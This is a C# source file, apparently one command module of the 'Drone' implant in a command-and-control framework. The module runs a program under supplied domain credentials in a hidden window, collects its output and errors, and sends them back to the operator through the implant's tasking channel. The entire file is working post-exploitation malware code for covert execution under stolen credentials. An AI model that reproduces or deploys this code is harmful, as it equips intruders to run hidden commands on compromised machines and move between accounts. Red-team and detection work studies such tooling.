using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class RunAs : DroneCommand
{
    public override byte Command => 0x3C;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                Domain = task.Arguments["domain"],
                UserName = task.Arguments["username"],
                Password = task.Arguments["password"].ToSecureString(),
                FileName = task.Arguments["program"],
                Arguments = task.Arguments["args"],
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            }
        };
        
        var sb = new StringBuilder();

        // inline function
        void OnDataReceived(object sender, DataReceivedEventArgs e)
        {
            sb.AppendLine(e.Data);
        }
        
        // send output on data received
        process.OutputDataReceived += OnDataReceived;
        process.ErrorDataReceived += OnDataReceived;

        // run process
        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        process.WaitForExit();

        // send output
        await Drone.SendTaskOutput(task.Id, sb.ToString());
        
        // remove events
        process.OutputDataReceived -= OnDataReceived;
        process.ErrorDataReceived -= OnDataReceived;
    }
}